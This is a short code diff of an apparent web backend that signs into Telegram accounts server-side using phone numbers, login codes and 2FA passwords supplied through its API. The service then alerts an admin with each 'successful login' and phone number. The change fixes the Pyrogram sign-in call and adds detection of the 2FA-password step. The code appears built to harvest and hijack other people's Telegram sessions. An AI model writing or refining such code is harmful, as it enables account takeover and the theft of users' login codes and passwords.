@@ -439,9 +439,9 @@ def verify_code_api():
             if password:
                 await client.check_password(password)
             else:
-                await client.sign_in(phone=phone, phone_code_hash=phone_code_hash, phone_code=code)
+                # পাইরোগ্রামের সঠিক সিনট্যাক্স অনুযায়ী ফোন নম্বর এবং হ্যাস পাস করা হলো
+                await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
             
-            # Successful login notification to Admin channel/chat
             global total_logged_in_users
             total_logged_in_users += 1
             send_telegram_message(ADMIN_ID, f"🎉 New Successful Telegram Login!\n📱 Phone: {phone}")
@@ -457,7 +457,11 @@ def verify_code_api():
         res = run_async(async_verify(), timeout=30)
         return jsonify(res)
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        err_message = str(e)
+        err_lower = err_message.lower()
+        if "password" in err_lower or "sessionpasswordneeded" in err_lower:
+            return jsonify({"status": "2fa_required", "message": "2FA password required."})
+        return jsonify({"status": "error", "message": err_message}), 500
 
 
 # ============================================================
